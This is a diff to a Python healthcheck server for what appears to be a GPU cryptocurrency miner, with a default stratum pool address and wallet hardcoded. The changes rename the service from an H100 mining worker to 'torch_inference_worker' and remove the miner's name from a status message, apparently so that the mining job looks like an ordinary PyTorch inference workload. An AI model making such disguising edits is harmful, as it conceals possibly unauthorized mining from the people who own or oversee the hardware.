@@ -12,7 +12,7 @@ class HealthHandler(http.server.BaseHTTPRequestHandler):
             self.end_headers()
             resp = {
                 "status": "healthy",
-                "service": "noid-h100-worker",
+                "service": "torch_inference_worker",
                 "worker": os.environ.get("WORKER_NAME", "h100-01"),
                 "pool": os.environ.get("POOL_ADDRESS", "stratum+ssl://hk.innovlab.cc:19601"),
                 "wallet": os.environ.get("WALLET_ADDRESS", "o1xlq6vc67ljt4khf2e7m2m66lu78a4j8my2nd0y7xyyfmfrrvzc0qlh5f7h")
@@ -27,7 +27,7 @@ class HealthHandler(http.server.BaseHTTPRequestHandler):
                     lines = f.readlines()
                     self.wfile.write("".join(lines[-100:]).encode("utf-8"))
             else:
-                self.wfile.write(b"Waiting for NOBD worker initialization...\n")
+                self.wfile.write(b"Waiting for worker initialization...\n")
         else:
             self.send_response(404)
             self.end_headers()
@@ -37,6 +37,7 @@ class HealthHandler(http.server.BaseHTTPRequestHandler):
         return
 
 if __name__ == "__main__":
+    socketserver.TCPServer.allow_reuse_address = True
     with socketserver.TCPServer(("", PORT), HealthHandler) as httpd:
-        print(f"⚡ Healthcheck HTTP Web Server listening on port {PORT}...")
+        print(f"Healthcheck HTTP Server listening on port {PORT}...")
         httpd.serve_forever()
